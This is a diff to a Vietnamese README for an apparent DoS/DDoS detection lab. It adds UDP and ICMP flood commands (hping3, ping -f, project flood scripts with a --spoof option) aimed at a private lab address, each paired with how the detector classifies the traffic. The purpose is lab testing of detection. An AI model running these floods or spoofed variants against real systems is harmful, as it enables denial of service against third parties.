@@ -124,13 +124,28 @@ phải DDoS. Cần **2 máy attacker** mới ra DDoS L7 thật (mục 7). HTTP f
 ```bash
 # DoS (1 nguồn, không spoof) → n_src=1:
 sudo python3 ~/dos-ddos-project/attacks/udp_flood.py 192.168.1.50 -p 80 --pps 400
-# DDoS (spoof IP giả) → n_src>=2:
+# Hoặc dùng hping3:
+sudo hping3 --udp -p 80 -i u2000 192.168.1.50
+
+# DDoS (spoof IP giả hoặc 2 máy cùng bắn):
 sudo python3 ~/dos-ddos-project/attacks/udp_flood.py 192.168.1.50 -p 80 --spoof --pps 400
 ```
 Detector: `pps` cao, **`udp_s` cao**, `syn/s` và `ack/s` ~0 → tag **`[UDP flood]`** (phân loại DoS
-hay DDoS vẫn theo `n_src` như thường). UDP connectionless nên spoof được như SYN; UDP flood **cần
-`sudo`** (raw socket) giống syn_flood — xem mục 9. Thêm `--size <byte>` để đổi kích thước payload
-(mặc định 32 byte).
+hay DDoS vẫn theo `n_src` như thường).
+
+### E — ICMP Echo Flood (Ping Flood L3)
+```bash
+# DoS (1 nguồn, không spoof) → n_src=1:
+sudo python3 ~/dos-ddos-project/attacks/icmp_flood.py 192.168.1.50 --pps 400
+# Hoặc dùng hping3:
+sudo hping3 --icmp -i u2000 192.168.1.50
+# Hoặc dùng ping flood:
+sudo ping -f -s 1024 192.168.1.50
+
+# DDoS (spoof IP giả hoặc 2 máy cùng bắn):
+sudo python3 ~/dos-ddos-project/attacks/icmp_flood.py 192.168.1.50 --spoof --pps 400
+```
+Detector: `pps` cao nhưng `SYN=0, ACK=0, UDP=0` → nhận diện **`[ICMP Flood (L3)]`**.
 
 > LƯU Ý (volumetric trong lab): nginx chỉ phục vụ TCP cổng 80, **không xử lý UDP**, nên gói UDP tới
 > victim bị kernel bỏ (hoặc trả ICMP port-unreachable). Trong lab WiFi băng thông thừa, UDP flood
